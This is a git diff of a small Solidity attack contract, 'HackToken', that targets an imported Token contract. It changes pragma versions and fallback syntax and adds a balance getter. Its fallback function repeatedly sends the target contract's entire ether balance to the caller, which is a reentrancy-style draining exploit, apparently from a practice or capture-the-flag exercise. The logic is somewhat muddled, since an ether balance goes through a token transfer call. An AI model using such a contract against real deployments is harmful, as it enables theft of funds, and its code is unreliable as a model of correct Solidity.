@@ -1,4 +1,4 @@
-pragma solidity ^0.6.0;
+pragma solidity ^0.5.0;
 import './Token.sol';
 
 contract HackToken{
@@ -7,11 +7,14 @@ contract HackToken{
     token = Token(_token);
  }
  function firstCall() public {
-    token.transfer(address(this), 1 ether);
+    token.transfer(address(this), 0.1 ether);
  }
- fallback() external payable {
+ function() external payable {
     if (address(token).balance > 0 ){
         token.transfer(msg.sender, address(token). balance);
     } 
+ }
+ function myBalance() public view returns(uint) {
+    return address(this).balance;
  }
 }
